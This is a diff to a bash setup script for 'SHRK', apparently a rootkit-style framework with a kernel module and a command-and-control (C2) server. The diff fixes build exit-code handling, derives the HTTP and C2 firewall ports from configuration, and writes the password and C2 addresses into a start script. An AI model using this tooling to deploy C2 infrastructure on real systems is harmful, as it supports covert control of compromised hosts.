@@ -198,7 +198,7 @@ build_clients() {
     
     # Try building kernel module with error handling
     make 2>&1 | tee /tmp/kernel_build.log
-    kernel_build_result=$?
+    kernel_build_result=${PIPESTATUS[0]}
     
     if [[ $kernel_build_result -eq 0 ]]; then
         log_success "Kernel module built successfully"
@@ -301,55 +301,52 @@ EOF
 setup_firewall() {
     log_info "Configuring firewall rules..."
     
+    # Extract port numbers from addresses
+    HTTP_PORT=$(echo "$SHRK_HTTP_ADDR" | cut -d':' -f2)
+    C2_PORT=$(echo "$SHRK_C2_ADDR" | cut -d':' -f2)
+    
     # Try to open ports with different firewall tools
     if command -v ufw &> /dev/null; then
-        ufw allow 7070/tcp
-        ufw allow 1053/udp
-        log_success "UFW rules added"
+        ufw allow ${HTTP_PORT}/tcp
+        ufw allow ${C2_PORT}/udp
+        log_success "UFW rules added for ports ${HTTP_PORT}/tcp and ${C2_PORT}/udp"
     elif command -v firewall-cmd &> /dev/null; then
-        firewall-cmd --permanent --add-port=7070/tcp
-        firewall-cmd --permanent --add-port=1053/udp
+        firewall-cmd --permanent --add-port=${HTTP_PORT}/tcp
+        firewall-cmd --permanent --add-port=${C2_PORT}/udp
         firewall-cmd --reload
-        log_success "Firewalld rules added"
+        log_success "Firewalld rules added for ports ${HTTP_PORT}/tcp and ${C2_PORT}/udp"
     elif command -v iptables &> /dev/null; then
-        iptables -A INPUT -p tcp --dport 7070 -j ACCEPT
-        iptables -A INPUT -p udp --dport 1053 -j ACCEPT
+        iptables -A INPUT -p tcp --dport ${HTTP_PORT} -j ACCEPT
+        iptables -A INPUT -p udp --dport ${C2_PORT} -j ACCEPT
         # Try to save iptables rules
         if command -v iptables-save &> /dev/null; then
             iptables-save > /etc/iptables/rules.v4 2>/dev/null || true
         fi
-        log_success "Iptables rules added"
+        log_success "Iptables rules added for ports ${HTTP_PORT}/tcp and ${C2_PORT}/udp"
     else
-        log_warning "No firewall tool detected. Please manually open ports 7070/tcp and 1053/udp"
+        log_warning "No firewall tool detected. Please manually open ports ${HTTP_PORT}/tcp and ${C2_PORT}/udp"
     fi
 }
 
 create_start_script() {
     log_info "Creating start script..."
     
-    cat > start-shrk.sh << 'EOF'
+    # Create start script directly with variables
+    cat > start-shrk.sh << EOF
 #!/bin/bash
 
 # SHRK Server Start Script
 
-export SHRK_PASSWORD="SHRK_PASSWORD_PLACEHOLDER"
-export SHRK_PATH="SHRK_PATH_PLACEHOLDER"
-export SHRK_HTTP_ADDR="SHRK_HTTP_ADDR_PLACEHOLDER"
-export SHRK_C2_ADDR="SHRK_C2_ADDR_PLACEHOLDER"
-export SHRK_HTTP_URL="SHRK_HTTP_URL_PLACEHOLDER"
-export SHRK_C2_URL="SHRK_C2_URL_PLACEHOLDER"
+export SHRK_PASSWORD="$SHRK_PASSWORD"
+export SHRK_PATH="$SHRK_PATH"
+export SHRK_HTTP_ADDR="$SHRK_HTTP_ADDR"
+export SHRK_C2_ADDR="$SHRK_C2_ADDR"
+export SHRK_HTTP_URL="$SHRK_HTTP_URL"
+export SHRK_C2_URL="$SHRK_C2_URL"
 
 cd server
 ./shrk_server.elf
 EOF
-
-    # Replace placeholders
-    sed -i "s/SHRK_PASSWORD_PLACEHOLDER/$SHRK_PASSWORD/g" start-shrk.sh
-    sed -i "s/SHRK_PATH_PLACEHOLDER/$SHRK_PATH/g" start-shrk.sh
-    sed -i "s/SHRK_HTTP_ADDR_PLACEHOLDER/$SHRK_HTTP_ADDR/g" start-shrk.sh
-    sed -i "s/SHRK_C2_ADDR_PLACEHOLDER/$SHRK_C2_ADDR/g" start-shrk.sh
-    sed -i "s|SHRK_HTTP_URL_PLACEHOLDER|$SHRK_HTTP_URL|g" start-shrk.sh
-    sed -i "s|SHRK_C2_URL_PLACEHOLDER|$SHRK_C2_URL|g" start-shrk.sh
     
     chmod +x start-shrk.sh
     
@@ -385,7 +382,11 @@ print_summary() {
         echo "  Install script:  scripts/install.sh"
     fi
     echo ""
-    echo -e "${YELLOW}Note: Make sure ports 7070/tcp and 1053/udp are open in your firewall${NC}"
+    
+    # Extract port numbers for the note
+    HTTP_PORT=$(echo "$SHRK_HTTP_ADDR" | cut -d':' -f2)
+    C2_PORT=$(echo "$SHRK_C2_ADDR" | cut -d':' -f2)
+    echo -e "${YELLOW}Note: Make sure ports ${HTTP_PORT}/tcp and ${C2_PORT}/udp are open in your firewall${NC}"
 }
 
 main() {
